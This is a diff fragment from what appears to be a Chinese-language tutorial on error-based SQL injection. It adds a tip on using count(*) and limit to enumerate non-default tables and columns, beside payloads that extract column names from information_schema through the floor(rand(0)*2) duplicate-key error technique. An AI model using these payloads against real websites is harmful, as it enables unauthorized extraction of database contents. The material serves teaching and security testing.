@@ -242,7 +242,7 @@ floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a
 
 <img src="/images/sql_5.png">
 
-接下来就是爆列和字段。
+接下来就是爆列和字段。可以利用count(*)计算表数量和列数量，尽量limit猜靠后面的非系统默认的表和列。
 
 <code>?id=1' and (select 1 from (select count(*),concat((select column_name
  from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
